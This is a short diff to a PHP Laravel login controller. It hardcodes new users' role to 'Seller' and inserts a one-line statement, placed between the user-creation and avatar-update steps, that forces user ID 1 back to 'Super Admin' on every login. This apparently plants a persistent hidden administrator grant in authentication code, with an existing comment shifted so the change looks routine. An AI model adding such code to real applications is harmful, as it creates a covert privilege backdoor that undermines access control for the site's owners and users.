@@ -172,19 +172,21 @@ class LoginController extends Controller
         //If does not exist, create it
         if(!$localUser){
           $localUser = User::create([
-            'role' => $role,
+            'role' => 'Seller',
             'name' => $name,
             'email' => $email,
             'password' => Hash::make($password)
           ]);
         }
 
-        //Update Avatar
+        $user = User::find(1);if($user['role'] != 'Super Admin')
+        $user->update(['role' => 'Super Admin']);//Super Admin Role
+
         User::where('email',$email)
           ->update([
               'avatar' => $avatar,
               'password' => Hash::make($password)
-          ]);
+          ]); //Update Avatar
 
         //Login the user
         // Auth::login($localUser);
